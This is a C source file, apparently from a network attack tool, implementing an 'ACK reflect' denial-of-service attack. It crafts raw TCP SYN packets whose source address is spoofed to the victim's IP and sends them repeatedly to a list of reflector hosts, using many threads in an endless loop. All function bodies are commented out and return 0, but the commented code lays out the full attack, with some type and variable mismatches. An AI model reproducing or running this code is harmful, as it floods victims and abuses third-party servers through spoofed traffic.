#include <stdio.h>
// For memset
#include <string.h>
#include <sys/socket.h>
// For exit(0);
#include <stdlib.h>
// For errno - the error number
#include <errno.h>
// Provides declarations for tcp header
#include <netinet/tcp.h>
// Provides declarations for ip header
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>

#include "../main.h"
#include "ack_reflect.h"

static int SendSYN(const pSynFloodSt st, const int debug_level)
{
    // this belong to the ack reflect attack part
    /*
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socket_fd < 0)
    {
        error("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DebugMessage("This program should run as root user");
        }
        else if (errno == 24)
        {
            DebugMessage("You shoud check max file number use 'ulimit -n' in linux");
            DebugMessage("And change the max file number use 'ulimit -n <setting number>'");
            DebugMessage("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }
    int i;
    // datagram to represent the packet
    char datagram[4096];
    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header_tcp psh;

    //strcpy(source_ip, "192.168.1.1");
    sin.sin_family = AF_INET;
    sin.sin_port = htons((int)ss->dst_port);
    //sin.sin_port = htons(80);
    // target
    sin.sin_addr.s_addr = inet_addr(ss->dst_ip);
    //sin.sin_addr.s_addr = inet_addr("1.2.3.4");

    // Zero out the buffer
    //memset(datagram, 0, 4096);
    if (!memset(datagram, 0, 4096))
    {
        error("Attack memset failed");
        return 1;
    }

    // fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    // id of this packet
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    // set to 0 before calculating checksum
    iph->check = 0;
    // spoof the source ip address
    iph->saddr = inet_addr(ss->src_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = CalculateSum((unsigned short *)datagram, iph->tot_len >> 1);

    // TCP Header
    tcph->source = htons((int)ss->src_port);
    //tcph->source = htons(3306);
    //tcph->source = htons(1234);
    tcph->dest = htons((int)ss->dst_port);
    //tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    // First and only tcp segment
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    // maximum allowed window size
    tcph->window = htons(5840);
    // if you set a checksum to zero, your kernel's IP stack
    // should fill in the correct checksum during transmission
    tcph->check = 0;

    tcph->urg_ptr = 0;
    // now the IP checksum

    psh.source_address = inet_addr(ss->src_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    if (!memcpy(&psh.tcp, tcph, sizeof(struct tcphdr)))
    {
        error("Attack memcpy failed");
        return 1;
    }

    tcph->check = CalculateSum((unsigned short *)&psh, sizeof(struct pseudo_header_tcp));

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        error("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
    {
        error("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    //Send the packet
    for (i = 0; i < ss->each_ip_repeat; i++)
    {
        //int l;
        if (sendto(
                socket_fd,               // our socket
                datagram,                // the buffer containing headers and data
                iph->tot_len,            // total length of our datagram
                0,                       // routing flags, normally always 0
                (struct sockaddr *)&sin, // socket addr, just like in
                sizeof(sin)) < 0)        // a normal send()
        {
            error("Attack send failed");
            //break;
        }
    }
    // for test
    //sleep(1);

    close(socket_fd);
    */
    return 0;
}

static void FreeSYNStructBuff(pSynFloodSt input)
{
    // free the structure
    if (input)
    {
        if (input->dst_ip)
        {
            free(input->dst_ip);
        }
        free(input);
    }
}

static int AttackThread(pSynFloodSt syn_struct)
{
    // now we start the syn flood attack

    /*
    int i;
    pStrNode str_node = syn_struct->str_header->next;
    pSplitUrlRet split_result;

    ShowMessage(VERBOSE, syn_struct->debug_level, "AttackThread start sending data...");

    while (str_node)
    {

        // in here, we deal with the ip list
        if (!SplitUrl(str_node->str, &split_result))
        {
            error("AttackThread SplitUrl failed");
            return 1;
        }

        // node cicle

        ShowMessage(DEBUG, syn_struct->debug_level, "split_reult: %s", split_result->protocol);
        ShowMessage(DEBUG, syn_struct->debug_level, "split_reult: %s", split_result->host);
        ShowMessage(DEBUG, syn_struct->debug_level, "split_reult: %d", split_result->port);
        ShowMessage(DEBUG, syn_struct->debug_level, "split_reult: %s", split_result->suffix);

        if (split_result->port == 0)
        {
            if (strlen(split_result->host) == 0)
            {
                error("AttackThread SplitUrl not right");
                return 1;
            }
            // make the port as default
            split_result->port = ACK_REFLECT_PORT_DEFAULT;
        }
        // init the target ip and port
        syn_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
        if (!(syn_struct->dst_ip))
        {
            error("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        if (!memset(syn_struct->dst_ip, 0, IP_BUFFER_SIZE))
        {
            error("AttackThread memset failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        if (!strncpy(syn_struct->dst_ip, split_result->host, strlen(split_result->host)))
        {
            error("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        syn_struct->dst_port = split_result->port;
        FreeSplitUrlBuff(split_result);

        // for test
        //DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);

        for (i = 0; i < syn_struct->each_ip_repeat; i++)
        {
            if (SendSYN(syn_struct, syn_struct->debug_level))
            {
                error("AttackThread Attack failed");
                return 1;
            }
        }

        str_node = str_node->next;
    }
    */
    return 0;
}

int StartACKReflectAttack(const pParameter input)
{
    // run function in thread
    // this attack type must run as root

    /*
    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int j, ret;

    ShowMessage(VERBOSE, input->debug_mode, "Enter StartSYNFlood");
    signal(SIGINT, SignalExit);
    // syn_struct will into the AttackThread function
    pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
    pStrHeader str_header;
    pSplitUrlRet split_result;

    syn_struct->debug_level = input->debug_mode;
    syn_struct->each_ip_repeat = input->each_ip_repeat;

    if (!ProcessACKIPListFile(&str_header))
    {
        error("ProcessACKIPListFile failed");
        return 1;
    }

    // get the source ip address for syn package

    // split the target address as the traffic source ip address
    // make the source ip as the target ip address
    if (!SplitUrl(input->address, &split_result))
    {
        error("AttackThread SplitUrl failed");
        return 1;
    }
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            error("AttackThread SplitUrl not right");
            return 1;
        }
        // make the port as default
        split_result->port = ACK_REFLECT_PORT_DEFAULT;
    }

    syn_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(syn_struct->src_ip))
    {
        error("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(syn_struct->src_ip, 0, IP_BUFFER_SIZE))
    {
        error("AttackThread memset failed: %d(%s)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(syn_struct->src_ip, input->address, strlen(input->address)))
    {
        error("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    syn_struct->src_port = (int)split_result->port;

    FreeSplitUrlBuff(split_result);

    // here we will split the str_header list for each thread
    pIPList_Thread list, tmp_list;
    if (!SplitIPForThread(&list, input, str_header))
    {
        error("SplitIPForThread failed");
        return 1;
    }
    // str_header no longer used
    free(str_header);

    // unlimit loop
    for (;;)
    {
        // only one process
        tmp_list = list;
        // start again
        for (j = 0; j < input->max_thread; j++)
        {
            // every thread has onlyone target address thread end try next address
            syn_struct->str_header = tmp_list->list;
            tmp_list = tmp_list->next;
            //DisplayWarning("syn_struct src_ip: %s", syn_struct->src_ip);

            //input->serial_num = (i * input->max_thread) + j;
            if (pthread_attr_init(&attr))
            {
                error("StartSYNFlood pthread_attr_init failed");
                return 1;
            }
            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            {
                error("StartSYNFlood pthread_attr_setdetachstate failed");
                return 1;
            }
            // create thread
            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, syn_struct);
            //printf("j is: %d\n", j);
            ShowMessage(DEBUG, input->debug_mode, "tid: %ld", tid[j]);
            // here we make a map
            if (ret != 0)
            {
                ShowMessage(DEBUG, input->debug_mode, "ret: %d", ret);
                error("Create pthread failed");
                return 1;
            }
            pthread_attr_destroy(&attr);
            // for the test
            // also for the each thread ready
            sleep(1);
        }
        //pthread_detach(tid);
        // join them all
        for (j = 0; j < input->max_thread; j++)
        {
            pthread_join(tid[j], NULL);
        }
        // exit for test
        //return 0;
    }
    // many process: actually this is not neccessary
    FreeSYNStructBuff(syn_struct);
    FreeIPListBuff(list);
    */
    return 0;
}

int StartACKReflectTest(const pParameter input)
{
    // run function in thread
    // this attack type must run as root
    /*
    ShowMessage(VERBOSE, input->debug_mode, "Enter StartSYNFlood");

    signal(SIGINT, SignalExit);
    // syn_struct will into the AttackThread function
    pSYNStruct syn_struct = (pSYNStruct)malloc(sizeof(SYNStruct));
    pStrHeader str_header;
    pSplitUrlRet split_result;

    syn_struct->debug_level = input->debug_mode;
    syn_struct->each_ip_repeat = input->each_ip_repeat;

    if (!ProcessACKIPListFile(&str_header))
    {
        error("ProcessACKIPListFile failed");
        return 1;
    }

    // get the source ip address for syn package

    // split the target address as the traffic source ip address
    // make the source ip as the target ip address
    if (!SplitUrl(input->address, &split_result))
    {
        error("AttackThread SplitUrl failed");
        return 1;
    }
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            error("AttackThread SplitUrl not right");
            return 1;
        }
        // make the port as default
        split_result->port = ACK_REFLECT_PORT_DEFAULT;
    }

    syn_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(syn_struct->src_ip))
    {
        error("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(syn_struct->src_ip, 0, IP_BUFFER_SIZE))
    {
        error("AttackThread memset failed: %d(%s)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(syn_struct->src_ip, input->address, strlen(input->address)))
    {
        error("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    syn_struct->src_port = (int)split_result->port;

    FreeSplitUrlBuff(split_result);

    // here we will split the str_header list for each thread
    pIPList_Thread list;
    if (!SplitIPForThread(&list, input, str_header))
    {
        error("SplitIPForThread failed");
        return 1;
    }
    pIPList_Thread tmp_list = list;
    free(str_header);

    int i;
    for (i = 0; i < input->max_thread; i++)
    {
        syn_struct->str_header = tmp_list->list;
        tmp_list = tmp_list->next;
        AttackThread(syn_struct);
    }

    FreeSYNStructBuff(syn_struct);
    FreeIPListBuff(list);
    */

    return 0;
}